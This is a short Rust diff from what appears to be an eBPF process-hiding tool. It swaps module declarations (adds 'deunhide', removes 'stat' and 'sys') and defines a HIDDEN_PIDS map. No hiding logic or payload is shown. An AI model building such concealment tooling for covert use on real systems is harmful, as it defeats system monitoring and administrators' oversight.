@@ -4,9 +4,8 @@ use aya_ebpf::{macros::map, maps::HashMap};
 use caracal_common::MAX_HIDDEN_PIDS;
 
 pub mod bpf;
+pub mod deunhide;
 pub mod pid;
-pub mod stat;
-pub mod sys;
 
 #[map]
 static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::<u32, u8>::with_max_entries(MAX_HIDDEN_PIDS, 0);
